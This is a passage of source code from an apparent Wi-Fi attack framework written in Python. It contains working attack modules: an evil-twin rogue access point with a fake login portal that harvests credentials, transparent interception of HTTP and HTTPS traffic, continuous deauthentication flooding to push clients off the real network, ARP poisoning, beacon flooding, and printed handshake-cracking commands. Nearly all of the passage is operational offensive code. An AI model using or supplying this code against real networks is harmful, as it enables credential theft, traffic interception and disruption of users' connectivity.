      }}
      if (!valid) return;

      btn.textContent = t.loading;
      btn.classList.add("loading");
      btn.disabled = true;

      // ── Submit the form to your backend ──────────────────────
      // Replace the lines below with your actual fetch/XHR call.
      // Example:
      //   fetch("/login", {{ method:"POST", body: new FormData(this) }})
      //     .then(r => r.json())
      //     .then(data => {{ ... }})
      //     .catch(err => {{ ... }});
      this.submit();   // <-- default: native POST to action="/login"
    }});

    document.getElementById("email").addEventListener("input", function() {{
      this.classList.remove("has-error");
      document.getElementById("err-email").classList.remove("show");
    }});

    document.getElementById("password").addEventListener("input", function() {{
      this.classList.remove("has-error");
      document.getElementById("err-password").classList.remove("show");
    }});
  </script>

</body>
</html>"""

    def __init__(self, iface_ap: str, ssid: str, channel: int = 6,
                 bssid: str = None, uplink_iface: str = None):
        self.iface_ap     = iface_ap
        self.ssid         = ssid
        self.channel      = channel
        self.bssid        = bssid        # optional BSSID to spoof in hostapd (MAC address)
        self.uplink_iface = uplink_iface or self._detect_uplink()
        self._creds       = []
        self._procs       = []

    def _detect_uplink(self) -> str:
        try:
            out   = subprocess.check_output(["ip", "route", "show", "default"], text=True)
            iface = out.split()[4]
            info(f"Auto-detected uplink: {C.YELLOW}{iface}{C.RESET}")
            return iface
        except Exception:
            warn("Could not auto-detect uplink. Defaulting to eth0.")
            return "eth0"

    def _write_hostapd(self):
        conf = (f"interface={self.iface_ap}\ndriver=nl80211\nssid={self.ssid}\n"
                f"hw_mode=g\nchannel={self.channel}\nmacaddr_acl=0\n"
                f"ignore_broadcast_ssid=0\nauth_algs=1\nwmm_enabled=0\n")
        if self.bssid:
            conf += f"bssid={self.bssid}\n"
        Path(self.HOSTAPD_CONF).write_text(conf)

    def _write_dnsmasq(self):
        conf = (f"interface={self.iface_ap}\n"
                f"dhcp-range={self.DHCP_START},{self.DHCP_END},12h\n"
                f"dhcp-option=3,{self.GW_IP}\ndhcp-option=6,{self.GW_IP}\n"
                f"server=8.8.8.8\nserver=1.1.1.1\nno-resolv\nlog-queries\nlog-dhcp\n"
                f"address=/captive.apple.com/{self.GW_IP}\n"
                f"address=/connectivitycheck.gstatic.com/{self.GW_IP}\n"
                f"address=/detectportal.firefox.com/{self.GW_IP}\n"
                f"address=/msftconnecttest.com/{self.GW_IP}\n"
                f"address=/clients3.google.com/{self.GW_IP}\n")
        Path(self.DNSMASQ_CONF).write_text(conf)

    def _write_mitm_addon(self):
        Path(self.MITM_SCRIPT).write_text(self.MITM_ADDON_CODE)

    def _setup_iptables(self):
        gw, ap, ul    = self.GW_IP, self.iface_ap, self.uplink_iface
        mport, fport  = str(self.MITM_PORT), str(self.FLASK_PORT)

        for cmd in [["iptables", "-F"], ["iptables", "-t", "nat", "-F"],
                    ["iptables", "-t", "mangle", "-F"], ["iptables", "-X"]]:
            subprocess.run(cmd, capture_output=True)

        for cmd in [
		["sysctl", "-w", "net.ipv4.ip_forward=1"],  
		# Enables IP forwarding so the machine can route packets between interfaces.

		["iptables","-t","nat","-A","POSTROUTING","-o",ul,"-j","MASQUERADE"],  
		# Applies NAT (masquerading) on outgoing packets through interface `ul`, hiding internal IPs.

		["iptables","-A","FORWARD","-i",ul,"-o",ap,
		 "-m","state","--state","RELATED,ESTABLISHED","-j","ACCEPT"],  
		# Allows return traffic from `ul` to `ap` only for already established connections.

		["iptables","-A","FORWARD","-i",ap,"-o",ul,"-j","ACCEPT"],  
		# Allows packets from `ap` interface to be forwarded out through `ul`.

		["iptables","-t","nat","-A","PREROUTING","-i",ap,"-p","tcp",
		 "--dport","80","!","-d",gw,"-j","REDIRECT","--to-port",mport],  
		# Redirects HTTP traffic (port 80) from `ap` clients (except gateway) to local port `mport` for interception.

		["iptables","-t","nat","-A","PREROUTING","-i",ap,"-p","tcp",
		 "--dport","443","!","-d",gw,"-j","REDIRECT","--to-port",mport],  
		# Redirects HTTPS traffic (port 443) from `ap` clients (except gateway) to local port `mport`.

		["iptables","-t","nat","-A","PREROUTING","-i",ap,"-p","tcp",
		 "--dport","80","-d",gw,"-j","REDIRECT","--to-port",fport],  
		# Redirects HTTP traffic specifically targeting the gateway to local port `fport`.
        ]:
            subprocess.run(cmd, capture_output=True)
            
    def _start_ap(self):
        self._write_hostapd()
        self._write_dnsmasq()
        subprocess.run(["ip", "addr", "flush", "dev", self.iface_ap],  capture_output=True)
        subprocess.run(["ip", "addr", "add", f"{self.GW_IP}/24", "dev", self.iface_ap],
                       capture_output=True)
        subprocess.run(["ip", "link", "set", self.iface_ap, "up"],     capture_output=True)
        self._setup_iptables()
        subprocess.run(["pkill", "-f", "hostapd"], capture_output=True)
        subprocess.run(["pkill", "-f", "dnsmasq"], capture_output=True)
        time.sleep(0.5)

        hp = subprocess.Popen(["hostapd", self.HOSTAPD_CONF],
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self._procs.append(hp)
        dm = subprocess.Popen(["dnsmasq", f"--conf-file={self.DNSMASQ_CONF}", "--no-daemon"],
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self._procs.append(dm)
        success(f"Evil Twin '{C.YELLOW}{self.ssid}{C.RESET}' ch{self.channel} | "
                f"GW:{C.CYAN}{self.GW_IP}{C.RESET} | via:{C.GREEN}{self.uplink_iface}{C.RESET}")

    def _start_mitmproxy(self):
        self._write_mitm_addon()
        try:
            mp = subprocess.Popen(
                ["mitmdump", "--mode", "transparent",
                 "--listen-host", "0.0.0.0", "--listen-port", str(self.MITM_PORT),
                 "--ssl-insecure", "-s", self.MITM_SCRIPT,
                 "--set", "block_global=false", "--quiet"],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            self._procs.append(mp)

            def _stream():
                for line in mp.stdout:
                    line = line.rstrip()
                    if line:
                        print(f"  {C.DIM}[mitm] {line}{C.RESET}")

            threading.Thread(target=_stream, daemon=True).start()
            success(f"mitmproxy transparent proxy → port {self.MITM_PORT}")
        except FileNotFoundError:
            warn("mitmdump not found – install: pip install mitmproxy")

    def _flask_portal(self):
        app = Flask(__name__)
        ssid, creds_ref = self.ssid, self._creds

        @app.route("/", defaults={"path": ""})
        @app.route("/<path:path>")
        def catch_all(path):
            return render_template_string(EvilTwin.PORTAL_HTML.format(ssid=ssid))

        @app.route("/login", methods=["POST"])
        def login():
            user = flask_req.form.get("username", ssid)
            pw   = flask_req.form.get("password", "")
            ip   = flask_req.remote_addr
            ts   = datetime.datetime.now().isoformat()
            print(f"\n{C.BG_RED}{C.WHITE}{C.BOLD}  ⚡ CREDENTIAL HARVESTED  {C.RESET}")
            print(f"  {C.CYAN}SSID    :{C.RESET} {ssid}\n"
                  f"  {C.CYAN}User    :{C.RESET} {C.GREEN}{user}{C.RESET}\n"
                  f"  {C.CYAN}Password:{C.RESET} {C.RED}{pw}{C.RESET}\n"
                  f"  {C.CYAN}Client  :{C.RESET} {ip}\n")
            creds_ref.append({"username": user, "password": pw, "ip": ip, "ts": ts})
            db_insert_cred(ssid, user, pw, f"captive_portal:{ip}")
            return redirect("https://www.google.com/", code=302)

        import logging
        logging.getLogger("werkzeug").setLevel(logging.ERROR)
        app.run(host="0.0.0.0", port=self.FLASK_PORT, debug=False, use_reloader=False)

    def run(self):
        section("Phase 3c – Evil Twin + Internet + HTTP Sniffer")
        self._start_ap()
        self._start_mitmproxy()
        threading.Thread(target=self._flask_portal, daemon=True).start()
        info("Waiting for clients... Press Ctrl+C to stop\n")
        try:
            while True:
                time.sleep(5)
        except KeyboardInterrupt:
            pass
        finally:
            self.stop()

    def stop(self):
        warn("Stopping Evil Twin...")
        for p in self._procs:
            try:    p.terminate()
            except Exception: pass
        for cmd in [["iptables", "-F"], ["iptables", "-t", "nat", "-F"],
                    ["iptables", "-t", "mangle", "-F"], ["iptables", "-X"],
                    ["sysctl", "-w", "net.ipv4.ip_forward=0"]]:
            subprocess.run(cmd, capture_output=True)
        success("Evil Twin stopped | iptables flushed")


# =============================================================================
#  P H A S E  3d  –  A C T I V E   E V I L   T W I N
#  Same as EvilTwin (Phase 3c) but uses a second adapter to continuously
#  broadcast deauth frames against the target AP, forcing clients to
#  disconnect and associate with our rogue AP instead.
# =============================================================================
class ActiveEvilTwin(EvilTwin):

    def __init__(self, iface_ap: str, iface_deauth: str, ssid: str, channel: int = 6,
                 uplink_iface: str = None, target_bssid: str = None):
        # Initialise the parent EvilTwin (AP mode, portal, mitmproxy).
        # NOTE: We do NOT pass bssid= to the parent here intentionally.
        # The parent's self.bssid controls whether hostapd spoofs a MAC.
        # For Active Evil Twin we want hostapd to run with the adapter's own
        # MAC (no spoof) so that the deauth interface can independently spoof
        # the real AP's BSSID without conflicting with the AP interface.
        super().__init__(iface_ap, ssid, channel, bssid=None, uplink_iface=uplink_iface)
        self.iface_deauth  = iface_deauth   # second adapter – put into monitor mode for deauth
        self.target_bssid  = target_bssid   # BSSID of the real AP we are cloning / deauthing
        self._deauth_stop  = threading.Event()

    # ------------------------------------------------------------------
    #  C O N T I N U O U S   D E A U T H   ( S c a p y   b r o a d c a s t )
    # ------------------------------------------------------------------
    def _deauth_loop(self):
        """
        Continuously sends 802.11 Deauthentication frames from the target
        AP's BSSID to the broadcast address ff:ff:ff:ff:ff:ff so every
        associated client is kicked off the real AP simultaneously.
        Runs in its own daemon thread until _deauth_stop is set.
        """
        if not SCAPY_OK:
            error("Scapy required for Active deauth – install: pip install scapy")
            return
        if not self.target_bssid:
            error("No target BSSID supplied – deauth thread aborting.")
            return

        # Put the deauth interface into monitor mode and lock it to the target channel
        InterfaceManager.set_monitor(self.iface_deauth)
        InterfaceManager.set_channel(self.iface_deauth, self.channel)
        time.sleep(0.5)

        attack(f"Active deauth thread started → {self.iface_deauth} "
               f"targeting {C.RED}{self.target_bssid}{C.RESET} "
               f"on CH {self.channel} (broadcast)")

        # Build the deauth packet once; reuse it every iteration.
        # addr1 = destination  (broadcast – hits every associated client)
        # addr2 = source       (spoofed as the real AP's BSSID)
        # addr3 = BSSID        (real AP's BSSID)
        pkt = (RadioTap() /
               Dot11(addr1="ff:ff:ff:ff:ff:ff",
                     addr2=self.target_bssid,
                     addr3=self.target_bssid) /
               Dot11Deauth(reason=7))   # reason 7 = "Class 3 frame received from nonassociated STA"

        burst = 5   # frames per burst – enough to reliably kick clients
        while not self._deauth_stop.is_set():
            try:
                sendp(pkt, iface=self.iface_deauth,
                      count=burst, inter=0.05, verbose=False)
            except Exception as e:
                error(f"Deauth send error: {e}")
                break
            # Short sleep between bursts – keeps pressure on the real AP
            # without hammering the kernel tx queue
            time.sleep(0.5)

        attack("Active deauth thread stopped.")

    # ------------------------------------------------------------------
    #  R U N
    # ------------------------------------------------------------------
    def run(self):
        section("Phase 3d – Active Evil Twin + Continuous Deauth + Internet + HTTP Sniffer")

        info(f"AP interface    : {C.YELLOW}{self.iface_ap}{C.RESET}")
        info(f"Deauth interface: {C.YELLOW}{self.iface_deauth}{C.RESET}")
        info(f"Target BSSID    : {C.RED}{self.target_bssid}{C.RESET}")
        info(f"Cloned SSID     : {C.GREEN}{self.ssid}{C.RESET}  CH {self.channel}")
        info(f"Uplink          : {C.CYAN}{self.uplink_iface}{C.RESET}")

        # 1. Start the rogue AP (hostapd + dnsmasq + iptables NAT)
        self._start_ap()

        # 2. Start mitmproxy transparent sniffer
        self._start_mitmproxy()

        # 3. Start captive-portal Flask app in background
        threading.Thread(target=self._flask_portal, daemon=True).start()

        # 4. Start continuous broadcast deauth in background
        deauth_thread = threading.Thread(target=self._deauth_loop, daemon=True)
        deauth_thread.start()

        info("Active Evil Twin running. Press Ctrl+C to stop.\n")
        try:
            while True:
                time.sleep(5)
        except KeyboardInterrupt:
            pass
        finally:
            self.stop()

    # ------------------------------------------------------------------
    #  S T O P
    # ------------------------------------------------------------------
    def stop(self):
        # Signal the deauth thread to exit cleanly before touching the interface
        self._deauth_stop.set()
        # Restore deauth interface to managed mode so the OS can reclaim it
        if self.iface_deauth:
            InterfaceManager.set_managed(self.iface_deauth)
        # Delegate remaining teardown (hostapd, dnsmasq, iptables flush) to parent
        super().stop()


# =============================================================================
#  P H A S E  4  –  P O S T - E X P L O I T A T I O N
# =============================================================================
class PostExploit:
    def arp_poison(self, iface: str, gateway: str, target: str):
        section("Phase 4 – MITM (ARP Poisoning)")
        attack(f"ARP Poison: target={C.RED}{target}{C.RESET} gw={C.RED}{gateway}{C.RESET}")
        from scapy.all import ARP, send, getmacbyip
        gw_mac  = getmacbyip(gateway)
        tgt_mac = getmacbyip(target)
        if not gw_mac or not tgt_mac:
            error("Could not resolve MACs – are you on the same subnet?")
            return
        pkt_gw  = ARP(op=2, pdst=gateway, hwdst=gw_mac,  psrc=target)
        pkt_tgt = ARP(op=2, pdst=target,  hwdst=tgt_mac, psrc=gateway)
        try:
            while True:
                send(pkt_gw,  verbose=False)
                send(pkt_tgt, verbose=False)
                time.sleep(1)
        except KeyboardInterrupt:
            info("Restoring ARP tables...")
            send(ARP(op=2, pdst=gateway, hwdst=gw_mac,  psrc=target,  hwsrc=tgt_mac),
                 count=5, verbose=False)
            send(ARP(op=2, pdst=target,  hwdst=tgt_mac, psrc=gateway, hwsrc=gw_mac),
                 count=5, verbose=False)
            success("ARP tables restored")

    def check_client_isolation(self, iface: str):
        section("Client Isolation Check")
        peer   = input(f"{C.CYAN}[?]{C.RESET} Peer client IP to test: ").strip()
        result = subprocess.run(["ping", "-c", "3", "-W", "1", peer],
                                capture_output=True, text=True)
        if result.returncode == 0:
            error(f"Client isolation DISABLED – can reach {peer}")
        else:
            success(f"Client isolation ENABLED – cannot reach {peer}")

    def egress_filter_check(self, gateway: str):
        section("Egress Filtering Check")
        ports = {22: "SSH", 1194: "OpenVPN", 1723: "PPTP", 4500: "IPSec",
                 53: "DNS", 80: "HTTP", 443: "HTTPS", 8080: "HTTP-Alt"}
        for port, name in ports.items():
            try:
                s = socket.create_connection((gateway, port), timeout=2)
                s.close()
                success(f"Port {port:>5} ({name:<10}) ALLOWED")
            except Exception:
                warn(f"Port {port:>5} ({name:<10}) BLOCKED / FILTERED")


# =============================================================================
#  D O S   /   J A M M I N G
# =============================================================================
class DoSModule:
    def beacon_flood(self, iface: str, count: int = 500):
        section("DoS – Beacon Flooding (Scapy)")
        if not SCAPY_OK:
            error("Scapy required for beacon flooding.")
            return
        attack(f"Sending {count} fake beacon frames...")
        import random, string
        for i in range(count):
            fake_ssid = "".join(random.choices(string.ascii_letters + string.digits, k=8))
            fake_mac  = ":".join([f"{random.randint(0, 255):02x}" for _ in range(6)])
            pkt = (RadioTap() /
                   Dot11(type=0, subtype=8,
                         addr1="ff:ff:ff:ff:ff:ff", addr2=fake_mac, addr3=fake_mac) /
                   Dot11Beacon(cap=0x2104) /
                   Dot11Elt(ID=0, info=fake_ssid.encode()) /
                   Dot11Elt(ID=1, info=b"\x82\x84\x8b\x96") /
                   Dot11Elt(ID=3, info=bytes([random.randint(1, 13)])))
            sendp(pkt, iface=iface, verbose=False)
            if i % 50 == 0:
                print(f"  {C.DIM}Sent {i}/{count} beacons{C.RESET}", end="\r")
        print()
        success("Beacon flood complete")

    def deauth_flood(self, iface: str, bssid: str, channel: int,
                     client: str = None, count: int = 0):
        section("DoS – Targeted Deauthentication (aireplay-ng)")
        target = client or "broadcast"
        attack(f"Deauth → {target} from {bssid} "
               f"(Count: {'Continuous' if count == 0 else count})")
        InterfaceManager.set_channel(iface, channel)
        time.sleep(0.5)
        cmd = ["aireplay-ng", "-0", str(count), "-a", bssid]
        if client:
            cmd.extend(["-c", client])
        cmd.append(iface)
        info(f"Running: {' '.join(cmd)}")
        try:
            subprocess.run(cmd)
            success("Deauth attack completed.")
        except KeyboardInterrupt:
            print()
            success("Deauth attack stopped by user.")


# =============================================================================
#  P H A S E  5  –  R E P O R T I N G
# =============================================================================
class Reporter:
    def __init__(self, db_path: Path = DB_PATH):
        self.db = db_path

    def _fetch(self, table: str) -> list:
        con = sqlite3.connect(self.db)
        con.row_factory = sqlite3.Row
        rows = con.execute(f"SELECT * FROM {table}").fetchall()
        con.close()
        return [dict(r) for r in rows]

    def to_json(self):
        out = {
            "generated":     datetime.datetime.now().isoformat(),
            "access_points": self._fetch("access_points"),
            "clients":       self._fetch("clients"),
            "handshakes":    self._fetch("handshakes"),
            "credentials":   self._fetch("credentials"),
            "http_traffic":  self._fetch("http_traffic"),
        }
        path = Path(f"report_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
        path.write_text(json.dumps(out, indent=2))
        success(f"JSON report → {C.GREEN}{path}{C.RESET}")

    def to_csv(self):
        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        for table in ("access_points", "clients", "handshakes", "credentials", "http_traffic"):
            rows = self._fetch(table)
            if not rows:
                continue
            path = Path(f"{table}_{ts}.csv")
            with open(path, "w", newline="") as f:
                w = csv.DictWriter(f, fieldnames=rows[0].keys())
                w.writeheader()
                w.writerows(rows)
            success(f"CSV → {C.GREEN}{path}{C.RESET}")

    def cracking_commands(self):
        section("Phase 5 – Cracking Commands")
        for hs in self._fetch("handshakes"):
            if hs["capfile"]:
                print(f"{C.YELLOW}# Handshake crack:{C.RESET}")
                print(f"  aircrack-ng {hs['capfile']} -w /usr/share/wordlists/rockyou.txt")
                print(f"  hcxpcapngtool -o hash.hc22000 {hs['capfile']}")
                print(f"  hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt\n")

    def show_http_traffic(self):
        section("Captured HTTP Traffic")
        rows = self._fetch("http_traffic")
        if not rows:
            warn("No HTTP traffic captured yet.")
            return
        table = []
        for row in rows[-50:]:
            mc = (f"{C.RED}{row['method']}{C.RESET}" if row["method"] == "POST"
                  else f"{C.CYAN}{row['method']}{C.RESET}")
            table.append([
                f"{C.DIM}{row['ts'][:19]}{C.RESET}",
                mc,
                f"{C.YELLOW}{row['host']}{C.RESET}",
                f"{C.WHITE}{row['url'][:50]}{C.RESET}",
                f"{C.GREEN}{row['post_body'][:30]}{C.RESET}" if row.get("post_body") else "",
            ])
        print(tabulate(table,
                       headers=["TIMESTAMP", "METHOD", "HOST", "URL", "POST BODY"],
                       tablefmt="grid"))
        
# =============================================================================
#  P N L   E X T R A C T O R
#  Passively sniffs 802.11 Probe Request frames to build each nearby device's
#  Preferred Network List (PNL) – the list of SSIDs a device auto-broadcasts
#  looking for.  No frames are transmitted; this is entirely passive.
# =============================================================================
class PNLExtractor:
    def __init__(self, iface: str, timeout: int = 30):
        self.iface   = iface
        self.timeout = timeout
        # pnl_data structure: { src_mac: { "ssids": set(), "channels": set() } }
        self.pnl_data = defaultdict(lambda: {"ssids": set(), "channels": set()})
        self._lock    = threading.Lock()
        self._running = False

    def _pkt_handler(self, pkt):
        try:
            # Probe Request: type=0 (Management), subtype=4
            if not (pkt.haslayer(Dot11) and
                    pkt[Dot11].type == 0 and
                    pkt[Dot11].subtype == 4):
                return

            src_mac = pkt[Dot11].addr2
            if not src_mac:
                return
            src_mac = src_mac.lower()

            # Skip broadcast / multicast source MACs (malformed frames)
            first_octet = int(src_mac.split(":")[0], 16)
            if first_octet & 0x01:
                return

            # Extract SSID from the first Dot11Elt (ID=0)
            ssid = ""
            if pkt.haslayer(Dot11Elt):
                elt = pkt[Dot11Elt]
                while elt:
                    if elt.ID == 0:
                        try:
                            ssid = elt.info.decode("utf-8", "ignore").strip()
                        except Exception:
                            ssid = ""
                        break
                    try:
                        elt = elt.payload[Dot11Elt]
                    except Exception:
                        break

            # Determine the channel the probe was captured on via RadioTap DS Parameter
            channel = 0
            if pkt.haslayer(Dot11Elt):
                elt = pkt[Dot11Elt]
                while elt:
                    if elt.ID == 3 and elt.info:
                        channel = elt.info[0]
                        break
                    try:
                        elt = elt.payload[Dot11Elt]
                    except Exception:
                        break

            # Wildcard probes (empty SSID) mean the device is looking for ANY network;
            # we record these as "<wildcard>" so they still appear in the output
            ssid_key = ssid if ssid else "<wildcard>"

            with self._lock:
                self.pnl_data[src_mac]["ssids"].add(ssid_key)
                if channel:
                    self.pnl_data[src_mac]["channels"].add(channel)

        except Exception:
            pass

    def _channel_hop(self):
        # Hop 2.4 GHz channels 1-14 only; PNL probes are almost exclusively 2.4 GHz
        channels = list(range(1, 15))
        while self._running:
            for ch in channels:
                if not self._running:
                    break
                InterfaceManager.set_channel(self.iface, ch)
                time.sleep(0.2)

    def run(self):
        section("PNL Extractor – Passive Probe Request Sniffer")
        info(f"Interface : {C.YELLOW}{self.iface}{C.RESET}")
        info(f"Duration  : {C.YELLOW}{self.timeout}s{C.RESET}")
        info(f"Hopping channels 1–14 and listening for Probe Requests...\n")

        self._running = True
        threading.Thread(target=self._channel_hop, daemon=True).start()

        try:
            sniff(iface=self.iface, prn=self._pkt_handler,
                  timeout=self.timeout, store=False)
        except KeyboardInterrupt:
            print()
            warn("PNL capture interrupted early by user.")

        self._running = False
        time.sleep(0.3)
        self._display()
        return self.pnl_data

    def _display(self):
        section("PNL Extractor – Results")
        if not self.pnl_data:
            warn("No Probe Requests captured. Try a longer duration or move closer to devices.")
            return

        # Build one row per (device, ssid) pair for readability
        rows = []
        for idx, (mac, data) in enumerate(sorted(self.pnl_data.items()), start=1):
            ssids    = sorted(data["ssids"])
            channels = ", ".join(str(c) for c in sorted(data["channels"])) or "N/A"
            mfr      = oui_lookup(mac)[:22]
            # First SSID on the same row as the MAC; subsequent SSIDs indented below
            for i, ssid in enumerate(ssids):
                if i == 0:
                    rows.append([
                        f"{C.CYAN}{idx}{C.RESET}",
                        f"{C.YELLOW}{mac}{C.RESET}",
                        f"{C.ORANGE}{mfr}{C.RESET}",
                        f"{C.WHITE}{ssid}{C.RESET}",
                        f"{C.BLUE}{channels}{C.RESET}",
                    ])
                else:
                    # Continuation rows: blank index/mac/mfr/channel columns
                    rows.append([
                        "",
                        "",
                        "",
                        f"{C.DIM}{ssid}{C.RESET}",
                        "",
                    ])

        print(tabulate(rows,
                       headers=["#", "Device MAC", "Manufacturer", "Probed SSID", "CH(s) seen"],
                       tablefmt="fancy_grid"))

        success(f"Captured PNL data for {C.GREEN}{len(self.pnl_data)}{C.RESET} unique device(s).")


# =============================================================================
#  M A I N   M E N U
# =============================================================================
def interactive_menu(ifaces: list):
    recon_data = {"aps": {}, "clients": defaultdict(set)}
    vuln       = VulnAssessment()
    dos        = DoSModule()
    reporter   = Reporter()
    iface      = ifaces[0] if ifaces else ""
    d_iface    = ifaces[1] if len(ifaces) > 1 else ""

    while True:
        # Build the [4a] line conditionally;
        # we check if the length of ifaces list is greater than 1;
        # if it is, means we can use one for deauth attack in the background;
        # while the other one will be used in AP mode
        active_et_line = (
            f"{C.TRUE_ORANGE} [4a]{C.RESET} Phase 3d - Evil Twin + Internet + Sniffer (Active)\n"
            if len(ifaces) > 1 else ""
        )

        print(f"""
{C.BOLD}{C.CYAN}╔══════════════════════════════════════════╗
║   WPF  -  Main Menu  v1.7.0              ║
╠══════════════════════════════════════════╣{C.RESET}
{C.GREEN} [1]{C.RESET} Phase 1  - Reconnaissance & Discovery (Scapy)
{C.GREEN} [c]{C.RESET} Phase 1b - Discover Clients for Specific AP
{C.YELLOW} [2]{C.RESET} Phase 2  - Vulnerability Assessment
{C.RED} [3]{C.RESET} Phase 3  - Handshake Capture (aircrack-ng)
{C.MAGENTA} [4]{C.RESET} Phase 3b - Evil Twin + Internet + Sniffer
{active_et_line}{C.ORANGE} [5]{C.RESET} Phase 3c - WPS Attack (Pixie-Dust / Brute)
{C.PURPLE} [6]{C.RESET} Phase 4  - Post-Exploitation / MITM
{C.CYAN} [7]{C.RESET} Phase 4b - DoS (Deauth & Beacon Flood)
{C.BLUE} [8]{C.RESET} Phase 5  - Reports & Cracking Commands
{C.GREEN} [9]{C.RESET} Interface Toggle (Monitor <-> Managed)
{C.YELLOW} [h]{C.RESET} Show Captured HTTP Traffic
{C.ORANGE} [p]{C.RESET} PNL Extractor
{C.DIM} [0]{C.RESET} Exit
{C.BOLD}{C.CYAN}╚══════════════════════════════════════════╝{C.RESET}""")

        choice = input(f"{C.CYAN}wpf>{C.RESET} ").strip().lower()

        if choice == "0":
            warn("Restoring interface and exiting...")
            if iface:
                InterfaceManager.set_managed(iface)
            sys.exit(0)

        elif choice == "9":
            iface  = input(f"Interface name [{iface}]: ").strip() or iface
            action = input("[m]onitor / [a]managed: ").strip().lower()
            if action == "m":
                InterfaceManager.set_monitor(iface)
            else:
                InterfaceManager.set_managed(iface)

        elif choice == "1":
            t            = int(input("Scan duration (seconds) [30]: ").strip() or "30")
            r            = Recon(iface, t)
            aps, clients = r.run()
            recon_data["aps"].update(aps)
            for bssid, macs in clients.items():
                recon_data["clients"][bssid].update(macs)

        elif choice == "c":
            if not recon_data.get("aps"):
                warn("Run Recon first (option 1) to populate AP list.")
                continue
            ap_list = list(recon_data["aps"].values())
            print(tabulate(
                [[i, a["bssid"], a.get("essid", "<hidden>"), a["channel"]]
                 for i, a in enumerate(ap_list)],
                headers=["Index", "BSSID", "ESSID", "Channel"], tablefmt="simple"))
            try:
                idx          = int(input("\nSelect AP index: "))
                ap           = ap_list[idx]
                t            = int(input("Duration (seconds) [30]: ").strip() or "30")
                r            = Recon(iface, t)
                aps, clients = r.run(target_bssid=ap["bssid"], channel=ap["channel"])
                recon_data["aps"].update(aps)
                for bssid, macs in clients.items():
                    recon_data["clients"][bssid].update(macs)
            except (ValueError, IndexError):
                error("Invalid selection.")

        elif choice == "2":
            vuln.run_all(recon_data.get("aps", {}))

        elif choice == "3":
            if not recon_data.get("aps"):
                warn("Run Recon first (option 1).")
                continue
            ap_list = list(recon_data["aps"].values())
            print(f"\n{C.BOLD}Available APs:{C.RESET}")
            print(tabulate(
                [[i, a["bssid"], a.get("essid", "<hidden>"), a["channel"], a["encryption"]]
                for i, a in enumerate(ap_list)],
                headers=["Index", "BSSID", "ESSID", "CH", "Encryption"],
                tablefmt="simple"
            ))
            try:
                idx = int(input("\nSelect AP index: "))
                ap = ap_list[idx]
                clients = list(recon_data["clients"].get(ap["bssid"], []))
                client = None
                if clients:
                    print("Clients:", ", ".join(clients))
                    c_in = input("Target client MAC (blank=broadcast): ").strip()
                    client = c_in or None
                HandshakeCapture(iface, ap["bssid"], ap.get("essid", "net"),
                            ap["channel"], client_mac=client, timeout=45).run()
            except (ValueError, IndexError):
                error("Invalid AP index.")

        elif choice == "4":
            ssid = input("SSID to clone: ").strip()
            ch = int(input("Channel [6]: ").strip() or "6")
            uplink = input("Uplink iface [auto]: ").strip() or None
            ap_iface = input(f"AP iface [{iface}]: ").strip() or iface
            bssid_spoof = input("Spoof BSSID (blank=skip): ").strip() or None
            EvilTwin(ap_iface, ssid, ch, bssid=bssid_spoof, uplink_iface=uplink).run()

        elif choice == "4a":
            # Guard: option 4a is only reachable when >1 wireless adapters are present;
            # this check is a safety net in case the user types 4a when only 1 iface exists
            if len(ifaces) <= 1:
                warn("Option [4a] requires more than one wireless adapter.")
                continue
            if not recon_data.get("aps"):
                warn("No APs scanned yet. Please use option [1] to scan nearby APs first.")
                continue
            ap_list = list(recon_data["aps"].values())
            print(f"\n{C.BOLD} Available Targets: {C.RESET}")
            print(tabulate(
                [[i, a["bssid"], a.get("essid", "<hidden>"), a["channel"],
                  a.get("rssi", "N/A"), a["encryption"]]
                for i, a in enumerate(ap_list)],
                headers=["Index", "BSSID", "ESSID", "CH", "RSSI", "Encryption"],
                tablefmt="simple"
            ))
            try:
                idx = int(input("\nSelect target AP index: "))
                ap  = ap_list[idx]  # we got the detail about the AP; stored in the "ap" variable;
                                    # we'll copy the SSID and channel from this variable and add
                                    # the same in the hostapd configuration file
                print(f"\n{C.BOLD}Selected Target:\n"
                      f"BSSID: {ap['bssid']}\n"
                      f"SSID : {ap.get('essid', '<hidden>')}\n"
                      f"CH   : {ap['channel']}{C.RESET}")

                # Handle empty/hidden SSID – ask user to supply one manually
                if not ap.get("essid") or len(ap.get("essid", "")) == 0:
                    ssid = input("Enter SSID for Evil Twin (AP has hidden SSID): ").strip()
                    ch   = int(input("Enter Channel: ").strip())
                else:
                    ssid = ap.get("essid")
                    ch   = ap["channel"]

                uplink       = input("Uplink iface [eth0]: ").strip() or "eth0"
                ap_iface     = input(f"AP interface [{iface}]: ").strip() or iface
                deauth_iface = input(f"Deauth interface [{d_iface}]: ").strip() or d_iface

                # Sanity check – AP iface and deauth iface must be different adapters
                if ap_iface == deauth_iface:
                    error("AP interface and Deauth interface must be different adapters. Aborting.")
                    continue

                print(f"\n{C.CYAN}Launching Active Evil Twin...{C.RESET}")
                print(f"  Target BSSID : {C.RED}{ap['bssid']}{C.RESET}")
                print(f"  Cloned SSID  : {C.GREEN}{ssid}{C.RESET}  CH {ch}")
                print(f"  AP mode      : {C.YELLOW}{ap_iface}{C.RESET}")
                print(f"  Deauth       : {C.YELLOW}{deauth_iface}{C.RESET}")
                print(f"  Internet via : {C.CYAN}{uplink}{C.RESET}\n")

                # Launch Active Evil Twin (rogue AP + continuous broadcast deauth + captive portal)
                ActiveEvilTwin(
                    iface_ap     = ap_iface,
                    iface_deauth = deauth_iface,
                    ssid         = ssid,
                    channel      = ch,
                    uplink_iface = uplink,
                    target_bssid = ap["bssid"],
                ).run()

            except (ValueError, IndexError):
                error("Invalid selection.")
            except Exception as e:
                error(f"Error: {e}")

        elif choice == "5":
            if not recon_data.get("aps"):
                warn("Run Recon first (option 1)."); continue
            wps_aps = [a for a in recon_data["aps"].values() if a.get("wps")]
            if not wps_aps:
                warn("No WPS-enabled APs found during recon."); continue

            print(f"\n{C.BOLD}WPS-Enabled Access Points:{C.RESET}")
            print(tabulate(
                [[i, a["bssid"], a.get("essid", ""), a["channel"]]
                 for i, a in enumerate(wps_aps)],
                headers=["Index", "BSSID", "ESSID", "Channel"], tablefmt="simple"))
            try:
                idx  = int(input("\nSelect AP index: "))
